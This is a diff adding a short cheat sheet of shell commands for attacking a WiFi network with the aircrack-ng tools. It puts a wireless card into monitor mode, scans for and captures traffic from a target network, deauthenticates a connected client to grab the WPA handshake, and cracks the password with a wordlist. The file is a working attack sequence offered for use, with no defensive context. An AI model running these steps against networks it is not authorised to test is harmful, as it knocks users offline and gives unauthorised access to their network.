@@ -1,0 +1,18 @@
+ifconfig
+iwctl
+
+sudo airmon-ng start wlan0   #To start wifi card in monitor mode
+sudo airmon-ng stop wlan0mon #To change wifi from monitor to managed mode
+
+sudo airodump-ng wlan0mon    #To scan wifi
+sudo airodump-ng -c(channel number : 1,2,3...) -w capfilename -d bssid wlan0mon
+
+#OPEN NEW WINDOW
+
+sudo aireplay-ng --deauth 0 -a bssid-of-wifi -c client-bssid wlan0mon
+
+#WAIT FOR HANDSHAKE TO OCCUR
+
+#WHEN SUCCESSFUL
+
+sudo aircrack-ng -w passwordlist.txt -b bssid capfilename.cap
